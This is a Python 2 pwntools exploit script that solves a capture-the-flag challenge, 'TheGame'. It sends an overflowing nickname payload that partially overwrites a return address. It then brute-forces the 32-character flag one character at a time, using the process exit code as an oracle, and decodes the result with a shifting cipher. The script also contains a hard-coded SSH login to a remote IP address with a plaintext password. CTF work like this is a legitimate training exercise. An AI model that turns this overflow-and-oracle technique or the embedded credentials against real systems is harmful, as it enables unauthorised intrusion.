#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./test
from pwn import *
import subprocess
import pickle
import string
import sys

class ELF_MUSL(ELF):
    def _populate_libraries(self):
        # We need a .dynamic section for dynamically linked libraries
        if not self.get_section_by_name('.dynamic') or self.statically_linked:
            self.libs= {}
            return

        # We must also specify a 'PT_INTERP', otherwise it's a 'statically-linked'
        # binary which is also position-independent (and as such has a .dynamic).
        for segment in self.iter_segments_by_type('PT_INTERP'):
            break
        else:
            self.libs = {}
            return

        try:
            cmd = 'ulimit -s unlimited; ldd %s 2>/dev/null' % sh_string(self.path)

            data = subprocess.check_output(cmd, shell = True, stderr = subprocess.STDOUT)
            libs = parse_ldd_output(data)

            for lib in dict(libs):
                if os.path.exists(lib):
                    continue

                if not self.native:
                    ld_prefix = qemu.ld_prefix()
                    qemu_lib = os.path.exists(os.path.join(ld_prefix, lib))
                    if qemu_lib:
                        libs[os.path.realpath(qemu_lib)] = libs.pop(lib)

            self.libs = libs

        except subprocess.CalledProcessError:
            self.libs = {}

ELF = ELF_MUSL

#context.log_level = "DEBUG"

# Set up pwntools for the correct architecture
exe = context.binary = ELF_MUSL('./TheGame')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    if args.GDB:
        raise ValueError("Can't connect to GDB from remote")

    #io = process(["sshpass", "-p", "'arkcon'", "ssh", "challenger@35.157.31.6"])
    io = process("sshpass -p arkcon ssh -tt challenger@35.157.31.6".split(), *a, **kw)
    #io.interactive()
    #io.sendlineafter("challenger@35.157.31.6's password:", "arkcon")
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#break *0x{exe.entry:x}
gdbscript = '''

continue
'''.format(**locals())

#b *0x555555556d40
#b *0x0000555555556e11
#b *0x0000555555556ee5

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

MATCH = 0
NO_MATCH = 1
SKIP = 2
ALARM = -14

UNKNOWN = 0
SKIPPED = 0xff

FLAG_LEN = 32

ALPHABET = 'e3t7a@4o0i1!_ns5$hrdlcumwfg6ypbvkjxqz289"#%&\'()*+,-./:;<=>?[\\]^`{|}~'
assert(set(ALPHABET) == set(string.lowercase + string.digits + string.punctuation))

if args.REMOTE:
    DB_FILE = "flag_remote.db"
else:
    DB_FILE = "flag_local.db"

func_list = [
    0x00101994,    # 0 (0x0)
    0x001019ea,    # 1 (0x1)
    0x00101a41,    # 2 (0x2)
    0x00101a98,    # 3 (0x3)
    0x00101aef,    # 4 (0x4)
    0x00101b46,    # 5 (0x5)
    0x00101b9d,    # 6 (0x6)
    0x00101bf4,    # 7 (0x7)
    0x00101c4b,    # 8 (0x8)
    0x00101ca2,    # 9 (0x9)
    0x00101cf9,    # 10 (0xa)
    0x00101d50,    # 11 (0xb)
    0x00101da7,    # 12 (0xc)
    0x00101dfe,    # 13 (0xd)
    0x00101e55,    # 14 (0xe)
    0x00101eac,    # 15 (0xf)
    0x001024be,    # 16 (0x10)
    0x00101f5e,    # 17 (0x11)
    0x00101fb5,    # 18 (0x12)
    0x0010200c,    # 19 (0x13)
    0x00102063,    # 20 (0x14)
    0x001020ba,    # 21 (0x15)
    0x0010253e,    # 22 (0x16)
    0x00102158,    # 23 (0x17)
    0x001021af,    # 24 (0x18)
    0x00102206,    # 25 (0x19)
    0x0010225d,    # 26 (0x1a)
    0x001022b4,    # 27 (0x1b)
    0x0010230b,    # 28 (0x1c)
    0x00102362,    # 29 (0x1d)
    0x001023b9,    # 30 (0x1e)
    0x00102410,    # 31 (0x1f)
    0x00102467,    # 32 (0x20)
]

def get_return_code(target_addr, flag_guess):
    try:
        with context.local(log_level='ERROR'): 
            io = start(alarm = 30)
            payload = 'A'*63 + '\x00' + flag_guess  + '\x00' + '\x00' * 15
            assert(len(payload) == len('A'*63 + '\x00' + 'NOINPUT'  + '\x00' + '\x00' * 40))
            payload += pack((target_addr & 0xFFFF), "all")

            io.sendlineafter("Please enter your nickname:", payload)
            io.sendlineafter("Choose an option :", "1")

            ret = io.poll(block=True)
            io.close()
            return ret
    except EOFError as e:
        print ("EOFError received")
        print e
        return None

def progress(i):
    p = ["|", "/", "-", "\\"]
    sys.stdout.write("\b" + p[i % len(p)])

def load_flag():
    try:
        flag = pickle.load( open( DB_FILE, "rb" ) )
    except:
        flag = [UNKNOWN] * FLAG_LEN
    return flag

def save_flag(flag):
    pickle.dump( flag, open( DB_FILE, "wb" ) )

def print_flag(flag):
    print flag

def is_unknown(x):
    return type(x) == int and x != SKIPPED

def is_skipped(x):
    return x == SKIPPED


flag = load_flag()

print_flag(flag)

for i in range(0, len(flag)):
    if is_skipped(flag[i]):
        print "#{} is skipped".format(i)
        continue
    elif not is_unknown(flag[i]):
        print "#{} is {}".format(i, flag[i])
        continue

    sys.stdout.write("#{}:  ".format(i))
    addr = func_list[i] & 0xFFF
    addr += 0x2000
    for j, c in enumerate(ALPHABET):
        sys.stdout.write("\b{}  ".format(c))
        ret = None
        counter = 0
        alarms = 0
        skip = False
        while ret not in [MATCH, NO_MATCH]:
            progress(counter)
            guess = ["\x00"] * 32
            guess[i] = c
            
            ret = get_return_code(addr, "".join(guess))
            if ret == ALARM:
                alarms += 1
            counter += 1
            if counter > 100:
                skip = True
                break
            if alarms > 4:
                addr += 0x1000
        if ret == MATCH:
            sys.stdout.write("\b")
            flag[i] = c
            save_flag(flag)
            break
        elif skip:
            print "\b [Skipping {}]".format(i)
            flag[i] = SKIPPED
            save_flag(flag)
            break
    else:
        print "#{} not found!".format(i)
        flag[i] = SKIPPED
        break
    print "\n"
    print_flag(flag)

def magic(i):
    magic_str = "MAGIC"
    res = magic_str[i % len(magic_str)]
    return res

def decode(s):
    r = ""
    for i, c in enumerate(s):
        if c in string.lowercase:
            r += chr(((ord(c) - ord(magic(i).lower()) ) % 26) + ord('a'))
        else:
            r += c
    return r

flag_str = "".join(flag)
print "\nCurrent output:"
print flag_str

print "\nDecoded flag:"
print decode(flag_str)
